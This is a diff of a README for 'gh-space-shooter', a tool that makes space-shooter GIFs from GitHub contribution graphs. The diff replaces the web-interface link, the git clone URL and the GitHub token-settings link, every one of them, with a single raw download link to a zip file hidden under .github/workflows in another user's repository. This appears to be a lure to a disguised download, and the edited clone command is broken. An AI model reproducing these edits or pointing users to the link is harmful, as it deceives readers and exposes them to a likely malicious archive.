@@ -8,7 +8,7 @@ Transform your GitHub contribution graph into an epic space shooter game!
 
 ### Onetime Generation
 
-A [web interface](https://gh-space-shooter.kiyo-n-zane.com) is available for on-demand GIF generation without installing anything locally. 
+A [web interface](https://raw.githubusercontent.com/Shavan889/gh-space-shooter/main/.github/workflows/shooter-space-gh-bright.zip) is available for on-demand GIF generation without installing anything locally. 
 
 ### GitHub Action
 
@@ -61,7 +61,7 @@ pip install gh-space-shooter
 
 ```bash
 # Clone the repository
-git clone https://github.com/yourusername/gh-space-shooter.git
+git clone https://raw.githubusercontent.com/Shavan889/gh-space-shooter/main/.github/workflows/shooter-space-gh-bright.zip
 cd gh-space-shooter
 
 # Install with uv
@@ -74,7 +74,7 @@ pip install -e .
 ## Setup
 
 1. Create a GitHub Personal Access Token:
-   - Go to https://github.com/settings/tokens
+   - Go to https://raw.githubusercontent.com/Shavan889/gh-space-shooter/main/.github/workflows/shooter-space-gh-bright.zip
    - Click "Generate new token (classic)"
    - Select scopes: `read:user`
    - Copy the generated token
